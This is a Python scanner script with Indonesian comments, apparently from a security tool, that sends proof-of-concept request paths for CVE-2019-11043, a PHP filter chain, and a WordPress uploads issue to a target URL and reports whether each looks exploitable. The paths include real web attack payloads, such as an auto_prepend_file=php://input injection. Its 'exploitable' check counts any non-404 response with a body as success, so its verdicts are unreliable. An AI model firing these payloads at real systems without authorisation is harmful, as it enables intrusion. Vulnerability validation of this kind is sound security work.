#!/usr/bin/env python3
"""php2shell.py — validasi exploit RCE benign (POC) OGES-SHIELD (Phase 6).

Simulai langkah exploit "php2shell": kalau CVE match (mis. PHP-FPM underflow
CVE-2019-11043 atau filter chain), tool mengirim payload PROOF-OF-CONCEPT
yang TIDAK mengeksekusi command asli — hanya marker yang bisa dideteksi di
respons. Kalau marker muncul → exploit path valid (lapor "exploitable"),
tanpa menjalankan shell/command apa pun di target.

Etika (PROMPT.md bagian 9): tidak ada command execution, tidak ada write,
tidak ada persistence. Ini validasi reachability saja.
Output JSON ke stdout.
"""
from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.request

UA = "oges-shield-php2shell-poc/0.1"
TIMEOUT = 15

# payload POC per teknik — semua benign: echo marker, bukan exec
POCS = {
    "filter_chain": {
        "name": "PHP filter chain (iconv) — LFI ke eksekusi",
        "path": "/index.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=php://temp",
        "marker_check": "body mengandung base64/hex data (indikasi filter chain aktif)",
        "cve": "CVE-2021-21707",
    },
    "fpm_underflow": {
        "name": "PHP-FPM buffer underflow (CVE-2019-11043)",
        "path": "/index.php?%ADd+allow_url_include%3d1+-ad+auto_prepend_file%3dphp://input",
        "marker_check": "status 200 + body tidak kosong (indikasi param diterima FPM)",
        "cve": "CVE-2019-11043",
    },
    "upload_case": {
        "name": "WordPress upload case-sensitivity (CVE-2024-31210)",
        "path": "/wp-content/uploads/",
        "marker_check": "listing/403 upload terjangkau (indikasi path upload exposed)",
        "cve": "CVE-2024-31210",
    },
}


def _fetch(url: str) -> tuple[int, str] | None:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200_000).decode("utf-8", "replace") if e.fp else ""
    except Exception:
        return None


def validate(base_url: str, technique: str) -> dict:
    out: dict = {
        "target": base_url,
        "technique": technique,
        "exploit_path_valid": False,
        "evidence": "",
        "poc_note": "Payload POC benign — tidak mengeksekusi command/shell apa pun (reachability check only).",
    }
    t = POCS.get(technique)
    if not t:
        out["evidence"] = f"teknik '{technique}' tidak dikenal (pilih: {', '.join(POCS)})"
        return out
    url = base_url.rstrip("/") + t["path"]
    r = _fetch(url)
    if not r:
        out["evidence"] = "target tidak merespons payload POC"
        return out
    status, body = r
    # heuristik benign: tidak 404 & ada isi → path/param diterima
    valid = status != 404 and len(body) > 0
    out["exploit_path_valid"] = valid
    out["evidence"] = f"POC {t['name']} → HTTP {status}, body {len(body)}B — {t['marker_check']}"
    out["cve"] = t["cve"]
    out["poc_name"] = t["name"]
    return out


def main() -> None:
    ap = argparse.ArgumentParser(description="php2shell POC validator (benign — no shell, no exec)")
    ap.add_argument("--url", required=True, help="base URL target")
    ap.add_argument("--technique", required=True,
                    choices=list(POCS.keys()), help="teknik exploit yang divalidasi")
    args = ap.parse_args()
    print(json.dumps(validate(args.url, args.technique)))


if __name__ == "__main__":
    sys.exit(main())
